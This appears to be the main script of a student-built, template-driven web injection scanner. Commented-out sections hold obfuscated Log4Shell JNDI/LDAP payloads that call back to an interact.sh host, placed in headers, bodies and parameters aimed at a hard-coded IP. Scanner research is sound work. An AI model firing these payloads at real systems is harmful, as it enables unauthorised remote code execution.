from scanner import PayloadInjection
from scanner.CommandHandle import CommandUtil
from generator.PayloadGenerator import PayloadGenerator
from services.InteractShService import InteractSh
from generator.TemplateConfigGenerator import TemplateConfigService
from scanner.RacoonKernel import RacoonKernel
from generator.RequestGenerator import RequestGenerator
import urllib3
from generator.InteractshGenerator import InteractshGenerator

urllib3.disable_warnings()
#127.0.0.1
#GET /test.html HTTP/1.1
# raw_request = """GET /test.html HTTP/1.1
# Host: 54.179.181.52:8001
# Accept: Accept
# Accept-Encoding: Accept-Encoding
# Accept-Language: Accept-Language
# Access-Control-Request-Headers: Access-Control-Request-Headers
# Access-Control-Request-Method: Access-Control-Request-Method
# Authentication: Basic Authentication
# Authentication: Bearer {{payload2}}
# Cookie: Cookie
# Location: Location
# Origin: Origin
# Referer: Referer
# Upgrade-Insecure-Requests: Upgrade-Insecure-Requests
# User-Agent: {{payload1}}
# X-Api-Version: {{payload2}}
# X-CSRF-Token: {{payload1}}
# X-Druid-Comment: X-Druid-Comment
# X-Forwarded-For: X-Forwarded-For
# X-Origin: X-Origin"""

# payloads = {
#     "payload1": ['a', 'b', 'c'],
#     "payload2": ['1', '2', '3'],
#     "payload3": ['blue', 'red', 'green']
# }

#
# payloads = {
#     "payload1":["""${jn${::::::-d}i:l${::::::-d}ap://${::::::-x}${::::::-f}.__param__.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh/a}""",
#                 """${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.__param__.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh/a}""",
#                 """${jndi:ldap://$c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh/a}"""],
#     "payload2":["""${jndi:ldap://accept.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh}""",
#                 """${jndi:ldap://acceptencoding.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh}"""],
#     "payload3":["""${jndi:ldap://${hostName}.authenticationbasic.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh}""",
#                 """${jndi:ldap://${hostName}.authenticationbearer.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh}""",]
# }

# payloads = {
#     "payload1":["""${jn${::::::-d}i:l${::::::-d}ap://${::::::-x}${::::::-f}.__param__.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh/a}""",
#                 """${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.__param__.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh/a}""",
#                 """${jndi:ldap://$c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh/a}"""],
#     "payload2":["""${jndi:ldap://accept.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh}""",
#                 """${jndi:ldap://acceptencoding.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh}"""]
# }

# payloads = {
#     "payload1":["""${jn${::::::-d}i:l${::::::-d}ap://${::::::-x}${::::::-f}.__param__.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh/a}""",
#                 """${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.__param__.c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh/a}""",
#                 """${jndi:ldap://$c9a44s32vtc00003jcpggrinncwyyyyyb.interact.sh/a}"""]
#     }
#
# headers = {
#     "Accept": "Accept",
#     "Accept-Encoding": "Accept-Encoding",
#     "Accept-Language": "Accept-Language",
#     "Access-Control-Request-Headers": "Access-Control-Request-Headers",
#     "Access-Control-Request-Method": "Access-Control-Request-Method",
#     "Authentication": "Basic Authentication",
#     "Authentication": "Bearer {{payload1}}",
#     "Cookie": "Cookie",
#     "Location": "Location",
#     "Origin": "Origin",
#     "Referer": "Referer",
#     "Upgrade-Insecure-Requests": "Upgrade-Insecure-Requests",
#     "User-Agent": "{{payload2}}",
#     "X-Api-Version": "{{payload1}}",
#     "X-CSRF-Token": "{{payload2}}",
#     "X-Druid-Comment": "X-Druid-Comment{{payload3}}",
#     "X-Forwarded-For": "X-Forwarded-For",
#     "X-Origin": "X-Origin",
#     "Content-Type": "application/x-www-form-urlencoded"
#     # "Content-Type": "application/json"
# }
# body = """user=admin{{payload1}}&pass=123%20{{payload1}}"""
# body = """Name=tester{{payload1}}&Tel=098764321&Email=tester%40gmail.com{{payload2}}&Message=message{{payload3}}"""
# body = """{"username": "tester{{payload1}}","password": "123456{{payload1}}"}"""
# body = """{"Name"="tester{{payload2}}","Tel":"098764321{{payload1}}","Email":"tester%40gmail.com{{payload1}}","Message":"message{{payload2}}"}"""
# body = None

# params = {
#     'name': 'Vans+Blue{{payload1}}',
#     'addr': 'xinchao{{payload2}}',
#     'phone': 'lalala{{payload3}}'
# }
# # params = None
# url = "http://54.179.181.52:8001/contact"
# HTTP_PROXY = {
#     "http": "http://127.0.0.1:8080",
#     "https": "http://127.0.0.1:8080"
# }


if __name__ == "__main__":
    filePath = r"D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\demo template\addBodyJsonAndQueryToCVE44228.yaml"
    args = CommandUtil()
    args.argument()
    args.argumentHandling()

    # interact = InteractSh()
    # interact_url = interact.registerInteractShServer()
    # print(interact_url)
    # input()
    # listObj = InteractshGenerator.generateInteractDataObjList(interact)
    # if listObj:
    #     for obj in listObj:
    #         print(obj.protocol)
    #         print(obj.request)
    #         print(obj.response)
    #         print("="*50)
    # exit()

    config = TemplateConfigService.getObjTemplateConfigByTemplate(filePath)
    requests = RequestGenerator.generateRequestObject(filePath)
    matcherObjList = TemplateConfigService.generateMatcherObjectList(filePath)
    extractorObjList = TemplateConfigService.generateExtractorObjectList(filePath)
    # print(config.reqCondition)
    # for matcherObj in matcherObjList:
    #     print(matcherObj.type)
    #     print(matcherObj.signature)
    #     print(matcherObj.part)
    #     print(matcherObj.negative)
    #     print(matcherObj.condition)
    # print("+"*40)
    # for extractorObj in extractorObjList:
    #     print(extractorObj.type)
    #     print(extractorObj.signature)
    #     print(extractorObj.part)
    #     print(extractorObj.internal)
    #     print(extractorObj.group)
    # exit()
    # print(requests)
    racoon = RacoonKernel()
    racoon.racoonFlowControl(config, requests)
    if config.interactSh:
        data, aes_key = config.interactSh.pollDataFromWeb()
        if aes_key:
            key = config.interactSh.decryptAESKey(aes_key)
            dataList = config.interactSh.decryptMessage(key, data)
            print(dataList)
        else:
            print("hello")
    exit()
    # data = TemplateConfigService.getObjTemplateConfigByTemplate(r"D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\demo template\addBodyJsonAndQueryToCVE44228.yaml")

    # print(data.scanMode)
    # print(data.stopAtFirstMatch)
    # print(data.payload.payloadValue)
    # print(data.thread)
    # print(data.redirect)
    # print(data.cookieReuse)
    # data = TemplateConfigService.getObjTemplateConfigByTemplate(r"D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\wordpress-weak-credentials.yaml")
    # print(data.interactShUrl)
    exit()
    interact = InteractSh()
    interact_url = interact.registerInteractShServer()
    print(interact_url)
    input()
    data, aes_key = interact.pollDataFromWeb()
    if aes_key:
        key = interact.decryptAESKey(aes_key)
        dataList = interact.decryptMessage(key, data)
        print(dataList)
    else:
        print("hello")
    exit()
    data = PayloadGenerator.generatePayloadObjFromTemplate(r"D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\wordpress-weak-credentials.yaml")
    # print(data.payloadValue)
    print(data)
    exit()
    print(len(data))
    for x in data:
        print(x)
        print("="*60)
    # requestHandle = RequestHandle()
    # print(requestHandle.requestConfig)
    exit()
    # headerList = PayloadInjection.pitchforkModeDictInjection(payloads, headers)
    # paramList = PayloadInjection.pitchforkModeDictInjection(payloads, params)
    # bodyList = PayloadInjection.pitchforkModeStringInjection(payloads, body)
    # for header, param, body in zip(headerList, paramList, bodyList):
    #     PayloadInjection.RequestHandle.sendPostRequest(url, param, header, body, HTTP_PROXY)
    #
    # exit()
    # headerList = PayloadInjection.pitchforkModeDictInjection(payloads, headers)
    # paramList = PayloadInjection.pitchforkModeDictInjection(payloads, params)
    # bodyList = PayloadInjection.pitchforkModeStringInjection(payloads, body)
    # for header, param, body in zip(headerList, paramList, bodyList):
    #     PayloadInjection.RequestHandle.sendPostRequest(header, body, param, url, HTTP_PROXY)
    #
    # exit()
    # # headers = findAndReplaceInDict(headers, "{{payload1}}", "xinchao")
    # # sendGetRequest(headers, body, params, url, HTTP_PROXY)
    # headerList = PayloadInjection.batteringramModeDictInjection(payloads, headers)
    # paramList = PayloadInjection.batteringramModeDictInjection(payloads, params)
    # bodyList = PayloadInjection.batteringramModeStringInjection(payloads, body)
    # for header, param, body in zip(headerList, paramList, bodyList):
    #     # try:
    #     # sendGetRequest(header, body, param, url, HTTP_PROXY)
    #     PayloadInjection.RequestHandle.sendPostRequest(header, body, param, url, HTTP_PROXY)
    #     # except:
    #         # pass
    #     # print(x)
    #     # print("="*50)
    #
    #     # url, params, headers, body, HTTP_PROXY